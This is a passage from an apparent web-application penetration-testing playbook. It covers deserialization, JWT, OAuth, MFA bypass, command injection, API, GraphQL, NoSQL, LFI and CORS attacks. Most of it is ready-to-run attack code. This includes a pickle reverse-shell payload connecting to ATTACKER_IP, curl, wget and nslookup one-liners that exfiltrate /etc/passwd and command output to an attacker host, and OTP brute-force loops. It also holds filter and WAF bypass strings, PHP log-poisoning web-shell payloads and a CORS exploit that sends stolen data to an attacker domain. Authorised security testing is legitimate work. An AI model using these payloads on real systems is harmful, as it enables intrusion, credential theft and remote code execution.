payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload.decode())
# Submit as cookie or API parameter

# Reverse shell pickle payload
class RevShell(object):
    def __reduce__(self):
        cmd = f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ATTACKER_IP} 4444 >/tmp/f'
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(RevShell()))
print(payload.decode())

# Detection: base64 decode of cookie → starts with KGNvc or \x80\x04
```

### 8.6 .NET Deserialization — ysoserial.net

```powershell
# BinaryFormatter
ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "cmd /c whoami"
ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -o base64 -c "cmd /c powershell -enc BASE64PAYLOAD"

# JSON.NET (TypeNameHandling)
ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "cmd /c calc"

# ViewState (.NET WebForms — requires MachineKey)
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" \
  --validationalg="SHA1" \
  --validationkey="CB2721ABDAF8E9DC516D7B1D8A2C8958C7F1A5DE"

# Inject into __VIEWSTATE parameter
```

### 8.7 Deserialization Quick Reference

| Platform | Tool | Detection Pattern | Detection Payload |
|----------|------|-------------------|-------------------|
| Java | ysoserial | `AC ED 00 05` / `rO0AB...` | URLDNS gadget → Collaborator DNS |
| PHP | phpggc | `O:`, `a:`, `s:`, `b:` | Modify serialized object properties |
| Python | Manual pickle | `\x80\x02` / `\x80\x04` | `__reduce__` with os.system |
| .NET | ysoserial.net | `AAEAAAD` (base64) | BinaryFormatter WindowsIdentity |
| Ruby | Marshal | `\x04\x08` | `_load` method abuse |
| Node.js | node-serialize | `_$$ND_FUNC$$_` | IIFE injection |

---

## Section 9: Authentication Bypass

**OWASP:** A07:2021 Identification and Authentication Failures | **CWE:** CWE-287, CWE-384

### 9.1 JWT Attacks

#### JWT Detection and Decoding

```bash
# JWT pattern: three base64url parts separated by dots
# eyJ... (header.payload.signature)

# Decode header
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# Output: {"alg":"HS256","typ":"JWT"}

# Decode payload
echo "eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIifQ" | base64 -d
# Output: {"sub":"1234567890","role":"user"}

# Full JWT analysis
python3 jwt_tool.py $JWT_TOKEN
```

#### Algorithm None Attack

```bash
# Step 1: Decode header
echo "$(echo $JWT_TOKEN | cut -d. -f1)" | base64 -d

# Step 2: Create new header with alg:none
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'

# Step 3: Modify payload to escalate privilege
echo -n '{"sub":"admin","role":"admin","iat":9999999999}' | base64 | tr -d '=' | tr '/+' '_-'

# Step 4: Combine (empty signature = trailing dot only)
# NEW_TOKEN = NEW_HEADER.MODIFIED_PAYLOAD.
# Example: eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.

# Try all case variants
{"alg":"none"}
{"alg":"None"}
{"alg":"NONE"}
{"alg":"nOnE"}

# Using jwt_tool
python3 jwt_tool.py $JWT_TOKEN -X a
```

#### RS256 to HS256 Algorithm Confusion

```bash
# Attack: Server uses RS256 (asymmetric). We sign with public key as HMAC secret.
# If server accepts HS256 tokens signed with the public key → privilege escalation

# Step 1: Obtain server's RSA public key
# Check: /.well-known/jwks.json, /api/jwks, TLS certificate
openssl s_client -connect $TARGET_DOMAIN:443 2>&1 | openssl x509 -pubkey -noout > $OUTPUT_DIR/pubkey.pem

# Step 2: Exploit with jwt_tool
python3 jwt_tool.py $JWT_TOKEN -X k -pk $OUTPUT_DIR/pubkey.pem

# Step 3: Modify payload claim
python3 jwt_tool.py $JWT_TOKEN -X k -pk $OUTPUT_DIR/pubkey.pem -I -pc role -pv admin
```

#### JWK Header Injection

```json
// Craft JWT with attacker-controlled JWK embedded in header
// Server may validate using the embedded key rather than a trusted key store

// Step 1: Generate RSA keypair
// openssl genrsa -out $OUTPUT_DIR/attacker.key 2048
// openssl rsa -in $OUTPUT_DIR/attacker.key -outform PEM -pubout -out $OUTPUT_DIR/attacker.pub

// Step 2: Inject public key into JWT header
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "kid": "my-key",
    "use": "sig",
    "n": "ATTACKER_PUBLIC_KEY_MODULUS",
    "e": "AQAB"
  },
  "typ": "JWT"
}
// Sign with attacker's private key

// Using jwt_tool
// python3 jwt_tool.py $JWT_TOKEN -X s
```

#### jku / x5u Header Injection

```bash
# jku = URL pointing to JWKS (key set)
# Inject attacker-controlled URL — server fetches keys for verification

# Step 1: Generate RSA keypair and host JWKS at $ATTACKER_DOMAIN/jwks.json
# Step 2: Craft JWT with attacker jku
python3 jwt_tool.py $JWT_TOKEN -X s -ju "https://$ATTACKER_DOMAIN/jwks.json"
```

#### kid Header Injection

```json
// kid (Key ID) may be used in file path or SQL query to look up signing key

// Path traversal — sign with empty string if key file is /dev/null
{"alg":"HS256","kid":"../../dev/null"}
// Sign using empty string as HMAC secret

// SQL injection via kid — sign with 'attacker-secret'
{"alg":"HS256","kid":"' UNION SELECT 'attacker-secret' -- -"}
// Sign using 'attacker-secret' as HMAC secret
```

#### Weak Secret Bruteforce

```bash
# hashcat
hashcat -a 0 -m 16500 $JWT_TOKEN /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 16500 $JWT_TOKEN /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# john
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt $OUTPUT_DIR/jwt.txt

# jwt_tool
python3 jwt_tool.py $JWT_TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Common weak secrets to try first
secret, password, 123456, jwt, key, your-256-bit-secret, qwerty, admin
```

#### JWT Attack Summary

| Attack | CVE | jwt_tool Flag | Impact |
|--------|-----|---------------|--------|
| None algorithm | CVE-2015-9235 | `-X a` | Skip signature verification |
| Key confusion RS256→HS256 | CVE-2016-5431 | `-X k -pk pub.pem` | Sign with public key |
| JWK injection | CVE-2018-0114 | `-X s` | Inject attacker JWK |
| jku SSRF | — | `-X s -ju URL` | Redirect key lookup |
| kid path traversal | — | Manual | Sign with known key |
| Weak secret | — | `-C -d wordlist` | Forge any token |

### 9.2 OAuth Misconfiguration Attacks

```bash
# Step 1: Identify OAuth flow
# Look for /authorize, /oauth/authorize, /auth/login?provider= endpoints

# redirect_uri manipulation attacks
# Original: redirect_uri=https://$TARGET_DOMAIN/callback
# Test manipulations:

# Open redirect in app
?redirect_uri=https://$TARGET_DOMAIN/callback?next=https://$ATTACKER_DOMAIN

# Path traversal
?redirect_uri=https://$TARGET_DOMAIN/callback/../../../redirect?to=https://$ATTACKER_DOMAIN

# @ symbol confusion
?redirect_uri=https://$ATTACKER_DOMAIN@$TARGET_DOMAIN/callback

# Subdomain wildcard (if allowed)
?redirect_uri=https://evil.$TARGET_DOMAIN/callback

# Fragment identifier
?redirect_uri=https://$TARGET_DOMAIN/callback#https://$ATTACKER_DOMAIN

# State parameter CSRF
# Remove state= parameter from authorization URL entirely
# → If accepted: CSRF account linking attack possible

# Scope escalation
scope=read → scope=read+write+admin

# Token leakage via Referer
# If page after token receipt has external resources (images, scripts)
# authorization code/token appears in Referer header of external requests

# Implicit flow token theft
# Intercept fragment: https://$TARGET_DOMAIN/callback#access_token=TOKEN&token_type=bearer
```

### 9.3 Session Management Attacks

```bash
# Session fixation
# 1. Obtain unauthenticated session ID
# 2. Trick victim to use that session ID (send in URL: ?PHPSESSID=ATTACKER_SESS)
# 3. When victim logs in, session binds to known ID
# 4. Attacker uses that same session ID

# Cookie security checks
curl -s -I $TARGET_URL | grep -i set-cookie
# Check for: Secure, HttpOnly, SameSite flags
# Missing Secure → sent over HTTP
# Missing HttpOnly → JS-readable (vulnerable to XSS theft)
# Missing SameSite → CSRF possible

# Session prediction (weak PRNG)
# Collect multiple session IDs
# Analyze for patterns, timestamps, sequential values
# Tools: OWASP WebScarab, Burp Sequencer
```

### 9.4 Password Reset Flaws

```bash
# Host header injection → poisoned reset link
curl -X POST $TARGET_URL/forgot-password \
  -H "Host: $ATTACKER_DOMAIN" \
  -d "email=victim@target.com"
# If reset email sent with link pointing to $ATTACKER_DOMAIN → attacker captures token

# Token never expires → use old reset links
# Test by requesting reset, waiting 24h, using same token

# Token predictability
# Pattern: MD5(timestamp + username)
# Enumerate: calculate MD5 of timestamps in window of request ±5 minutes
python3 -c "
import hashlib, time
base = int(time.time())
for t in range(base-300, base+300):
    print(hashlib.md5(f'{t}victim'.encode()).hexdigest())
"

# Username enumeration via timing difference
# time curl -X POST $TARGET_URL/forgot-password -d 'email=admin@target.com'
# vs
# time curl -X POST $TARGET_URL/forgot-password -d 'email=nonexistent@target.com'
# Different response times → user enumeration possible
```

### 9.5 MFA Bypass Techniques

```bash
# 1. Direct endpoint access (skip MFA step)
# After password, before MFA page, navigate directly to /dashboard
# Check if server enforces MFA based on session state

# 2. Response manipulation
# Intercept 2FA verification response in Burp
# Modify: {"valid":false,"error":"Invalid code"} → {"valid":true}

# 3. OTP reuse (no invalidation)
# Use previously captured valid OTP again

# 4. Brute force OTP (no rate limiting)
# 6-digit OTP = 1,000,000 combinations
for i in $(seq -f "%06g" 0 999999); do
  result=$(curl -s -X POST $TARGET_URL/verify-mfa \
    -d "otp=$i&session=$SESSION_COOKIE" \
    -w "%{http_code}")
  if [[ "$result" == *"200"* ]]; then
    echo "Valid OTP: $i"
    break
  fi
done

# 5. OTP in response (some apps return OTP in API response for SMS delivery)
# Intercept /send-otp API response and look for otp, code, token fields
```

---

## Section 10: Command Injection

**OWASP:** A03:2021 Injection | **CWE:** CWE-78 | **Severity:** Critical

### 10.1 Attack Chain Overview

```
IDENTIFY parameters that interact with OS commands
  → CONFIRM injection (time-based or OOB if blind)
    → ESTABLISH reliable command execution
      → EXFILTRATE data or establish reverse shell
```

### 10.2 Common Injection Points

```
- Ping utilities: ?host=8.8.8.8
- DNS lookup: ?domain=example.com
- Traceroute/nmap: ?target=192.168.1.1
- File processing: convert, ffmpeg, wkhtmltopdf
- Email utilities: mail -s "subject"
- System commands taking user input (backup, report generators)
```

### 10.3 Basic Detection Payloads

```bash
# Command chaining operators
; id
| id
|| id
& id
&& id
`id`
$(id)

# Time-based (blind confirmation)
; sleep 5
| sleep 5
&& sleep 5
; ping -c 5 127.0.0.1
; timeout 5 ping -c 5 127.0.0.1

# Windows equivalents
& timeout 5
| timeout 5
; timeout /T 5 /NOBREAK
```

### 10.4 Operator Reference

| Operator | Behavior | Example |
|----------|----------|---------|
| `;` | Run cmd2 regardless of cmd1 | `ping; id` |
| `&&` | Run cmd2 only if cmd1 succeeds | `ping && id` |
| `\|\|` | Run cmd2 only if cmd1 fails | `ping \|\| id` |
| `\|` | Pipe cmd1 output to cmd2 | `ping \| id` |
| `` `cmd` `` | Command substitution (backtick) | `` `id` `` |
| `$(cmd)` | Command substitution (POSIX) | `$(id)` |
| `%0a` | URL-encoded newline | `ping%0aid` |

### 10.5 Blind Command Injection — Out-of-Band Confirmation

```bash
# DNS exfiltration (most reliable — works through most firewalls)
; nslookup $(whoami).$ATTACKER_DOMAIN
; nslookup `whoami`.$ATTACKER_DOMAIN
; curl http://$(whoami).$ATTACKER_DOMAIN/
; wget http://$ATTACKER_DOMAIN/$(id|base64|tr -d '\n')

# HTTP exfiltration
; curl http://$ATTACKER_IP/?output=$(id|base64)
; wget -q -O- "http://$ATTACKER_IP/$(cat /etc/passwd|base64)"
; curl -d @/etc/passwd http://$ATTACKER_IP/exfil

# interactsh (ProjectDiscovery)
; nslookup abc123.oast.fun
; curl http://abc123.oast.fun/`whoami`

# Burp Collaborator
; nslookup $COLLAB_URL
; curl $COLLAB_URL/cmdi-$(whoami)
```

### 10.6 Filter Bypass Techniques

```bash
# Space bypass
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
cat<>/etc/passwd
cat</etc/passwd
{cat,/etc/passwd}
X=$'cat\x20/etc/passwd'&&$X
IFS=,;`cat<<<cat,/etc/passwd`

# Slash bypass
cat${HOME:0:1}etc${HOME:0:1}passwd   # Uses HOME variable (starts with /)
echo${IFS}Y2F0IC9ldGMvcGFzc3dk|base64${IFS}-d|bash

# Wildcard injection
cat /et?/pass*
cat /etc/p?sswd
ls /???/???s/*        # Matches /usr/bins/* etc

# Encoded characters
$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)

# Variable manipulation (single quotes break pattern matching)
cat /e''tc/pa''sswd
cat /e"t"c/pa"s"swd
c'a't /etc/passwd
who\ami

# Bypass keyword blacklist
c'a't /etc/passwd      # Quoted chars break keyword filters
/usr/bin/wh?ami         # Wildcard in command name
/bin/c[a]t /etc/passwd  # Character class

# Reading files without cat
< /etc/passwd
rev /etc/passwd | rev
head -c 5000 /etc/passwd
while read l; do echo $l; done < /etc/passwd

# Avoid substrings (for WAF evasion)
a=cat;b=/etc/passwd;$a $b
cmd=(id);${cmd[@]}
bash<<<$(base64 -d<<<aWQ=)

# Null byte
;id%00
id%0awhoami
```

### 10.7 Windows Command Injection

```cmd
; ipconfig
& ipconfig
| ipconfig
|| ipconfig
`ipconfig`
$(ipconfig)
&& ipconfig

# PowerShell execution
& powershell -c "whoami"
; powershell -enc BASE64PAYLOAD
; cmd /c "dir C:\"

# Bypass characters
^w^h^o^a^m^i     # Carets
w"ho"ami          # Double quotes inside command
```

### 10.8 Argument Injection

```bash
# When application passes user input as arguments (not directly to shell)
# but argument parsing is vulnerable

# curl argument injection
--output /var/www/html/shell.php
--proxy http://$ATTACKER_IP:8080

# wget argument injection
-O /var/www/html/shell.php
--post-file /etc/passwd http://$ATTACKER_IP/

# git argument injection
--upload-pack=touch /tmp/pwned
--config=core.sshCommand='cmd /c whoami'

# ssh argument injection
-oProxyCommand=cmd
-oStrictHostKeyChecking=no

# Test: inject -- followed by options
; --help
; -v
```

### 10.9 Commix Automation

```bash
# Basic detection and exploitation
commix --url="$TARGET_URL/page?host=$INJECTION_POINT"

# POST parameter
commix -u "$TARGET_URL/page" --data="param=INJECT_HERE" -p param

# Cookie injection
commix -u "$TARGET_URL/page" --cookie="session=INJECT_HERE" -p session

# HTTP header injection
commix -u "$TARGET_URL/page" --header="X-Forwarded-For: *"

# Specify technique
commix --url="$TARGET_URL?param=*" --technique=T  # Time-based
commix --url="$TARGET_URL?param=*" --technique=C  # Classic (output visible)

# Shell
commix --url="$TARGET_URL?cmd=*" --os-shell

# From Burp request file
commix -r $OUTPUT_DIR/request.txt --os-shell
```

### 10.10 Evidence Collection — Command Injection

```bash
# Capture time delay
time curl -s "$TARGET_URL/page?host=127.0.0.1;sleep+10" \
  > /dev/null 2>&1

# Capture OOB DNS interaction from interactsh/Collaborator log

# Show command output via direct injection
curl "$TARGET_URL/page?host=127.0.0.1;id"

# Save request and response pair for report
```

---

## Section 11: API Security Testing

**OWASP API Security Top 10 2023** | **Severity:** Variable (Critical to Medium)

### 11.1 API Reconnaissance

```bash
# Find API endpoints from JavaScript
python3 linkfinder.py -i $TARGET_URL -d -o $OUTPUT_DIR/js-endpoints.html

# Historical API endpoint discovery
gau $TARGET_DOMAIN | grep '/api/' | sort -u > $OUTPUT_DIR/api-gau.txt
waybackurls $TARGET_DOMAIN | grep '/api/' | sort -u >> $OUTPUT_DIR/api-gau.txt

# Common API paths to probe
for path in /api /api/v1 /api/v2 /api/v3 /rest /graphql /swagger.json /openapi.json /api-docs /redoc; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL$path")
  echo "$code $TARGET_URL$path" >> $OUTPUT_DIR/api-discovery.txt
done

# Kiterunner — specialized API endpoint discovery
kiterunner scan $TARGET_URL \
  -w /path/to/routes-large.kite \
  -x 20 \
  --fail-status-codes 400,401,404 \
  -o $OUTPUT_DIR/kiterunner.txt

# ffuf — fuzz API paths
ffuf -u $TARGET_URL/api/v1/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,400,401,403 \
  -o $OUTPUT_DIR/api-ffuf.json

# GitHub dorking for API keys and endpoints
# site:github.com "$TARGET_DOMAIN" "api_key"
# site:github.com "$TARGET_DOMAIN" "Authorization: Bearer"
# site:github.com "$TARGET_DOMAIN" "access_token"
```

### 11.2 Authentication Testing (API1-API2:2023)

```bash
# Test unauthenticated access
curl -s $TARGET_URL/api/v1/users

# Test broken authentication
curl -s $TARGET_URL/api/v1/users -H "Authorization: Bearer INVALID_TOKEN"
curl -s $TARGET_URL/api/v1/users -H "Authorization: Bearer "
curl -s $TARGET_URL/api/v1/users -H "Authorization: "

# Test for sensitive data in response
# Check every API endpoint for unexposed fields: password_hash, ssn, full_credit_card, private_key
curl -s $TARGET_URL/api/v1/users/me | python3 -m json.tool | grep -E '(password|hash|secret|key|token|ssn|card)'
```

### 11.3 BOLA / IDOR Testing (API1:2023)

```bash
# Horizontal IDOR — access other users' resources
# Authenticated as User A (ID 1001):
curl -s $TARGET_URL/api/v1/users/1001/profile \
  -H "Authorization: Bearer $JWT_TOKEN"

# Try accessing User B (ID 1002):
curl -s $TARGET_URL/api/v1/users/1002/profile \
  -H "Authorization: Bearer $JWT_TOKEN"

# Common BOLA patterns
for id in 1 2 3 4 5 100 101 1000 1001 1002; do
  curl -s "$TARGET_URL/api/v1/users/$id" \
    -H "Authorization: Bearer $JWT_TOKEN" \
    -o $OUTPUT_DIR/bola-user-$id.json
done

# Test encoded IDs
echo -n "user_1002" | base64  # Encode modified value
# Then use in request

# Find IDs from other endpoints
# Check: order responses, notification emails, search results for other users' IDs

# Burp Autorize extension — automated IDOR testing
# Setup: configure high-priv and low-priv tokens, run through all endpoints
```

### 11.4 Mass Assignment (API6:2023)

```bash
# Regular registration request
curl -X POST $TARGET_URL/api/v1/users/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","email":"attacker@test.com","password":"password"}'

# Add extra fields — attempt privilege escalation
curl -X POST $TARGET_URL/api/v1/users/register \
  -H "Content-Type: application/json" \
  -d '{
    "username":"attacker",
    "email":"attacker@test.com",
    "password":"password",
    "role":"admin",
    "is_admin":true,
    "subscription":"premium",
    "verified":true,
    "credit":9999
  }'

# Update endpoint mass assignment
curl -X PUT $TARGET_URL/api/v1/users/me \
  -H "Authorization: Bearer $JWT_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Attacker","role":"admin","is_admin":true}'
```

### 11.5 Rate Limiting Bypass (API4:2023)

```bash
# Basic rate limit test
for i in {1..100}; do
  curl -s -X POST $TARGET_URL/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"test$i\"}" \
    -w "%{http_code}\n" -o /dev/null
done

# Rate limit bypass techniques
# 1. IP rotation via headers
curl -X POST $TARGET_URL/api/auth/login \
  -H "X-Forwarded-For: 10.0.0.$i"  # Rotate IP
  -H "X-Real-IP: 10.0.0.$i"

# 2. Null byte in header value
# 3. Different case in header names
# 4. Use GraphQL batching to send N requests as one HTTP call
```

### 11.6 GraphQL Security Testing

```bash
# Step 1: Detect GraphQL endpoint
for path in /graphql /gql /api/graphql /graphql/v1 /query; do
  curl -s -X POST "$TARGET_URL$path" \
    -H "Content-Type: application/json" \
    -d '{"query":"{__typename}"}' \
    -o $OUTPUT_DIR/graphql-probe-$$.json
done

# Step 2: Full schema introspection
curl -s -X POST $TARGET_URL/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name description } } mutationType { fields { name } } types { name kind fields { name type { name kind } } } } }"}' \
  -o $OUTPUT_DIR/graphql-schema.json

# Bypass introspection disable via newline
curl -s -X POST $TARGET_URL/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema\n{ queryType\n{ name } } }"}'

# Step 3: Field suggestion (info leak when introspection disabled)
curl -s -X POST $TARGET_URL/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ usr { id } }"}'
# Response may contain: Did you mean 'user'?

# Step 4: IDOR via GraphQL
curl -s -X POST $TARGET_URL/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $JWT_TOKEN" \
  -d '{"query":"{ user(id: \"1234\") { email password creditCard } }"}'

# Step 5: Batching attack (bypass rate limiting)
curl -s -X POST $TARGET_URL/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation{login(username:\"admin\",password:\"pass1\"){token}}"},
    {"query":"mutation{login(username:\"admin\",password:\"pass2\"){token}}"},
    {"query":"mutation{login(username:\"admin\",password:\"pass3\"){token}}"}
  ]'

# Step 6: SQL/NoSQL injection in GraphQL arguments
curl -s -X POST $TARGET_URL/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users(filter: \"1=1 -- \") { id username email } }"}'

# Step 7: GraphQL SSRF
curl -s -X POST $TARGET_URL/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { fetchURL(url: \"http://169.254.169.254/latest/meta-data/\") { result } }"}'

# Alias abuse (DoS)
curl -s -X POST $TARGET_URL/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ a1:user(id:1){email} a2:user(id:2){email} a3:user(id:3){email} }"}'
```

**GraphQL Tools:**

```bash
# graphw00f — fingerprint GraphQL engine
graphw00f -t $TARGET_URL/graphql

# graphql-cop — security audit
graphql-cop -t $TARGET_URL/graphql

# clairvoyance — reconstruct schema without introspection
clairvoyance -u $TARGET_URL/graphql -o $OUTPUT_DIR/schema.json

# InQL — Burp Suite extension for visual schema exploration
# Install via Burp Extension Store
```

### 11.7 WebSocket Security Testing

```bash
# Identify WebSocket endpoints (look in JS source)
grep -r 'new WebSocket' $OUTPUT_DIR/js-files-content.txt
grep -r 'ws://' $OUTPUT_DIR/js-files-content.txt

# Test WebSocket with wscat
wscat -c "wss://$TARGET_DOMAIN/ws"
# Once connected, send test messages:
# {"action":"getUser","id":"1"}
# {"action":"getUser","id":"2"}  ← IDOR test

# WebSocket CSRF (no SameSite protection on WS handshake)
# Host at attacker.com:
var ws = new WebSocket('wss://$TARGET_DOMAIN/ws');
ws.onopen = function() { ws.send('{"action":"deleteUser","id":"victim_id"}'); };

# WebSocket smuggling (upgrade request manipulation)
# Test if HTTP request smuggling via WS upgrade is possible
```

### 11.8 Evidence Collection — API Security

```bash
# Save all API responses for BOLA testing
for id in $(seq 1000 1010); do
  curl -s "$TARGET_URL/api/v1/users/$id" \
    -H "Authorization: Bearer $JWT_TOKEN" \
    -o $OUTPUT_DIR/bola-evidence-$id.json
done

# Document mass assignment findings
# Save request with extra fields + response showing updated values

# Capture GraphQL introspection output
# Save schema JSON from introspection query

# Rate limit test evidence — show HTTP 200 responses to login attempts 50+
```

---

## Section 12: Additional Attack Techniques

### 12.1 NoSQL Injection (MongoDB)

```bash
# Authentication bypass via operator injection (JSON body)
curl -s -X POST $TARGET_URL/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'

curl -s -X POST $TARGET_URL/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$gt":""},"password":{"$gt":""}}'

curl -s -X POST $TARGET_URL/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":"wrongpassword"}}'

# URL parameter NoSQL injection
?user[$ne]=x&password[$ne]=x
?user[$gt]=&password[$gt]=
?username[$regex]=.*&password[$regex]=.*

# Data extraction (boolean blind)
?user[$regex]=^a      # Username starts with 'a'
?user[$regex]=^ad     # Username starts with 'ad'
?user[$regex]=^adm    # Continue until full username found
```

### 12.2 Path Traversal / LFI

```bash
# Basic traversal
curl "$TARGET_URL/page?file=../../../etc/passwd"
curl "$TARGET_URL/page?file=../../../../etc/passwd"

# Encoding variants
curl "$TARGET_URL/page?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
curl "$TARGET_URL/page?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
curl "$TARGET_URL/page?file=....//....//....//etc//passwd"

# PHP wrappers (if PHP app)
curl "$TARGET_URL/page?file=php://filter/convert.base64-encode/resource=/etc/passwd"
curl "$TARGET_URL/page?file=php://filter/convert.base64-encode/resource=../config.php"
echo "BASE64_OUTPUT" | base64 -d

# LFI to RCE — log poisoning
# Step 1: Poison Apache access log via User-Agent
curl -A '<?php system($_GET["cmd"]); ?>' $TARGET_URL

# Step 2: Include the access log via LFI
curl "$TARGET_URL/page?file=/var/log/apache2/access.log&cmd=id"

# LFI to RCE — /proc/self/environ
curl -H "User-Agent: <?php system('id'); ?>" $TARGET_URL
curl "$TARGET_URL/page?file=/proc/self/environ"

# Key Linux files to read via LFI
# /etc/passwd, /etc/shadow, /etc/hosts, /etc/hostname
# /proc/self/environ, /proc/self/cmdline
# /var/log/apache2/access.log
# ~/.ssh/id_rsa, ~/.aws/credentials
# /var/www/html/config.php, /var/www/html/.env
```

### 12.3 CORS Misconfiguration

```bash
# Test for Origin reflection
curl -s -I -H "Origin: https://$ATTACKER_DOMAIN" $TARGET_URL/api/user \
  -H "Cookie: $SESSION_COOKIE" | grep -i "access-control"

# Vulnerable if response shows:
# Access-Control-Allow-Origin: https://$ATTACKER_DOMAIN
# Access-Control-Allow-Credentials: true

# Test null origin
curl -s -I -H "Origin: null" $TARGET_URL/api/user \
  -H "Cookie: $SESSION_COOKIE" | grep -i "access-control"

# Subdomain injection
curl -s -I -H "Origin: https://$TARGET_DOMAIN.$ATTACKER_DOMAIN" $TARGET_URL/api/user

# CORS exploit (host on $ATTACKER_DOMAIN):
var req = new XMLHttpRequest();
req.open('GET', 'https://$TARGET_DOMAIN/api/user', true);
req.withCredentials = true;
req.onload = function() {
    fetch('https://$ATTACKER_DOMAIN/steal?d='+btoa(req.responseText));
};
req.send();
```

### 12.4 HTTP Request Smuggling (Detection)

```bash
# CL.TE smuggling probe (Content-Length vs Transfer-Encoding)
curl -s -X POST $TARGET_URL/http-smuggling-probe \
  -H "Content-Length: 4" \
  -H "Transfer-Encoding: chunked" \
  -d $'1\r\nZ\r\n0\r\n\r\n' \
  --http1.1

# Use Burp Suite HTTP Request Smuggler extension for automated testing
# Or: smuggler.py (James Kettle's tool)
python3 smuggler.py -u $TARGET_URL

# Indicators: unexpected behavior on subsequent requests, 404 on next request,
#             response desynchronization, internal state exposure
```

---

## Appendix A: Tool Quick Reference

### Core Web App Tools

| Tool | Primary Use | Key Command |
|------|-------------|-------------|
| sqlmap | SQL injection automation | `sqlmap -r request.txt --dbs --batch` |
| commix | Command injection automation | `commix --url="URL?param=*"` |
| tplmap | SSTI automation | `tplmap -u "URL?param=*" --os-shell` |
| dalfox | XSS automation | `dalfox url "URL?q=test"` |
| ffuf | Fuzzing (dirs, params, vhosts) | `ffuf -u URL/FUZZ -w wordlist.txt` |
| feroxbuster | Recursive directory bruteforce | `feroxbuster -u URL -w wordlist.txt` |
| nuclei | Template-based vuln scanner | `nuclei -u URL -t cves/ -t exposures/` |
| katana | Web crawler | `katana -u URL -d 5` |
| jwt_tool | JWT attack automation | `python3 jwt_tool.py TOKEN -M at` |
| ysoserial | Java deserialization payloads | `java -jar ysoserial.jar CC1 'id'` |
| phpggc | PHP deserialization payloads | `phpggc Laravel/RCE7 system id` |
| kiterunner | API endpoint discovery | `kiterunner scan URL -w routes.kite` |
| graphql-cop | GraphQL security audit | `graphql-cop -t URL/graphql` |

### Wordlists Reference

| Purpose | Path |
|---------|------|
| Directory brute force | `/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt` |
| File enumeration | `/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt` |
| Common files | `/usr/share/seclists/Discovery/Web-Content/common.txt` |
| API endpoints | `/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt` |
| Subdomains | `/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt` |
| Passwords | `/usr/share/wordlists/rockyou.txt` |
| XSS payloads | `/usr/share/seclists/Fuzzing/XSS/XSS-BruteLogic.txt` |
| SQLi payloads | `/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt` |

---

## Appendix B: OWASP / CWE / CVSS Mapping

| Vulnerability | OWASP 2021 | CWE | CVSS Base | Severity |
|---------------|------------|-----|-----------|----------|
| SQL Injection | A03 Injection | CWE-89 | 9.8 | Critical |
| Command Injection | A03 Injection | CWE-78 | 9.8 | Critical |
| SSTI | A03 Injection | CWE-94 | 9.8 | Critical |
| File Upload (RCE) | A03 Injection | CWE-434 | 9.8 | Critical |
| Insecure Deserialization | A08 Data Integrity | CWE-502 | 9.8 | Critical |
| XXE | A05 Misconfiguration | CWE-611 | 8.2 | High |
| SSRF | A10 SSRF | CWE-918 | 8.6 | High-Critical |
| XSS (Stored) | A03 Injection | CWE-79 | 8.8 | High |
| XSS (Reflected) | A03 Injection | CWE-79 | 6.1 | Medium |
| JWT Vulnerabilities | A07 Auth Failures | CWE-287 | 9.1 | Critical |
| OAuth Misconfiguration | A01 Access Control | CWE-285 | 8.1 | High |
| BOLA/IDOR | A01 Access Control | CWE-284 | 7.5 | High |
| Mass Assignment | A06 Vulnerable Components | CWE-915 | 7.5 | High |
| CORS Misconfiguration | A05 Misconfiguration | CWE-942 | 7.5 | High |
| NoSQL Injection | A03 Injection | CWE-943 | 9.8 | Critical |

---

## Appendix C: WAF Bypass Universal Reference

```
1. Whitespace alternatives
   %09 (tab), %0A (newline), %0D (CR), %0C (form feed)
   /**/ (SQL comment as space)
   ${IFS} (Bash Internal Field Separator)

2. Case variation
   SeLeCt, UnIoN, aLeRt, OnErRoR

3. URL encoding
   %27 = '     %22 = "     %20 = space
